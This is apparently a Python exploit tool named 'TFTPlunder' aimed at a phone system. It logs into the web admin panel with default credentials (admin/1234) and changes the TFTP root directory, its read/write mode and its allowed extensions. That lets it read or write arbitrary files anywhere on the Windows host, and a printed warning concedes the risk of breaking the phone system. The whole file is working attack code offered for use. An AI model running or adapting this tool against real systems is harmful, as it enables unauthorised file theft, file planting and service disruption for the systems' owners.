from requests.auth import HTTPDigestAuth
import requests
from pathlib import PureWindowsPath
from tftp import TFTPClient
from lxml import html


# http_proxy  = "http://localhost:8080"
# https_proxy = "https://localhost:8080"
# ftp_proxy   = "ftp://localhost:8080"

# proxyDict = { 
#               "http"  : http_proxy, 
#               "https" : https_proxy, 
#               "ftp"   : ftp_proxy
#             }


def parse_form(form):
    tree = html.fromstring(form)
    data = {}
    for e in tree.cssselect('form input'):
        if e.get('name'):
            data[e.get('name')] = e.get('value')
    return data

class TFTPlunder:
    def __init__(self,host,tftp_port=69,web_port=8086,user="admin",passwd="1234",proxies=None):
        self.host=host
        self.tftp_port=tftp_port
        self.web_port=web_port
        self.params=dict(auth=HTTPDigestAuth(user, passwd))
        if proxies:
            self.params["proxies"]=proxies

        self.forms_data=parse_form(
            requests.get(f"http://{self.host}:{self.web_port}/config/parameters/Parameters", **self.params).content)
        
        self.extensions_allowed={v for k,v in self.forms_data.items() if k.startswith("Prop_0_val")}
        
        self.greatest_existing_prop_0_extensions_key=int(sorted([k.split('_')[3] for k,v in self.forms_data.items() if k.startswith("Prop_0_val")])[-1])
        
        self.original_folder_to_put_back_at_the_end=self.forms_data['Prop_4_val_0']
        print(f"remember to changedir back to {self.original_folder_to_put_back_at_the_end} when you are done if you don't want to mess up the whole phone system")
        
        self.dir_dict=dict()
        self.last_dir="CHANGEME"
        self.last_dir_result=False


    def _get_forms_data_for_dir(self,dir:str):
        to_return=dict(self.forms_data)
        to_return['Prop_4_val_0']=dir
        to_return['_Action']='apply'
        to_return['Prop_3_val_0']='Read and Write'
        return to_return

    def _dir_exists(self,path_obj:PureWindowsPath):
        parents=list(path_obj.parents)
        parents.reverse()
        #pprint(dir_dict)
        for p in parents:
            if p not in self.dir_dict:
                #print(f'testing {p.as_posix()}/')
                self.dir_dict[p]=self._change_dir(p.as_posix()+'/')
            if self.dir_dict[p]==False: return False
        return True
    
    def _add_extension_to_allowed_list(self,extension:str):
        if extension not in self.extensions_allowed:
            self.forms_data[f"Prop_0_val_{self.greatest_existing_prop_0_extensions_key+1}"]=extension
            self.greatest_existing_prop_0_extensions_key+=1
            self.extensions_allowed.add(extension)
            

    def _change_dir(self,dir:str)->bool:#true if changed succesfully
        if dir!=self.last_dir:
            #print(f'changing to {dir}')
            response=requests.post(f"http://{self.host}:{self.web_port}/config/parameters/Parameters/postback", data=self._get_forms_data_for_dir(dir),**self.params)
            self.last_dir=dir
            last_dir_result=response.text.find("Changes successfully committed!")!=-1 or response.text.find("Configuration did not change!")!=-1
        return last_dir_result
    

    def get_file(self,path:str):
        path_obj=PureWindowsPath(path)
        file=path_obj.name
        parent=path_obj.parent.as_posix()+'/'
        if not self._dir_exists(path_obj.parent): return None
        self._change_dir(parent)
        try:
            file = TFTPClient(self.host, self.tftp_port, 512,1).get_file(file)
            return file
        except:
            pass
        return None


    def put_file(self,path:str,name:str,file:bytes)-> bool:#returns whether succesful
        self._add_extension_to_allowed_list(name.split('.')[-1])
        path_obj=PureWindowsPath(path)
        file=path_obj.name
        parent=path_obj.parent.as_posix()+'/'
        if not self._dir_exists(path_obj.parent): return False
        self._change_dir(parent)
        
        try:
            TFTPClient(self.host, self.tftp_port, 512,1).put_file(name=name,data=file)
            return True
        except:
            pass
        return False

